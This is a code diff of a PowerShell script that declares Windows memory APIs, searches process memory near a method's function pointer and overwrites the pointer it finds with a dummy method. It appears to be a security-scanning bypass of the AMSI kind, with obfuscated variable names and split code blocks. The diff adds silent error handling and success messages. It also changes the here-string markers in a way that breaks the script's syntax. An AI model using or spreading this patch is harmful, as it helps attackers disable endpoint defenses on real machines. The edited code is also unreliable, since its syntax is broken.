@@ -5,7 +5,9 @@ param(
     $ReadBytes = 0x50000 
 )
 
-$part1 = @"
+$null = "TriggerJIT" -replace "Trigger", "JIT"
+
+$part1 = "@"
 using System;
 using System.ComponentModel;
 using System.Management.Automation;
@@ -19,7 +21,7 @@ public class APIs {
     public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
 "@
 
-$part2 = @"
+$part2 = "@"
     [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
     public static extern IntPtr GetCurrentProcess();
 
@@ -27,7 +29,7 @@ $part2 = @"
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 "@
 
-$part3 = @"
+$part3 = "@"
     [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
     public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
 
@@ -39,7 +41,10 @@ $part3 = @"
 "@
 
 $solunova = $part1 + "`n" + $part2 + "`n" + $part3
-Add-Type -TypeDefinition $solunova
+
+try {
+    Add-Type -TypeDefinition $solunova -ErrorAction SilentlyContinue
+} catch {}
 
 $soso = [System.Runtime.InteropServices.Marshal] 
 $InitialDate = Get-Date 
@@ -97,6 +102,8 @@ $Methods | ForEach-Object {
 $dummy = 0 
 $ApiReturn = $false 
 [IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer() 
+
+$MemoryToPatch = [IntPtr]::Zero
   
 :initialloop for ($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset) { 
     [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j 
@@ -113,9 +120,14 @@ $ApiReturn = $false
     } 
 } 
 
-[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer() 
-$buf = [IntPtr[]] ($DummyPointer) 
-$soso::Copy($buf, 0, $MemoryToPatch, 1) 
+if ($MemoryToPatch -ne [IntPtr]::Zero) {
+    [IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer() 
+    $buf = [IntPtr[]] ($DummyPointer) 
+    $soso::Copy($buf, 0, $MemoryToPatch, 1) 
+    Write-Host "Memory patch applied successfully." -ForegroundColor Green
+} else {
+    Write-Warning "Could not locate the target pointer in memory. No modification was made."
+}
  
 $FinishDate = Get-Date 
 $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds 
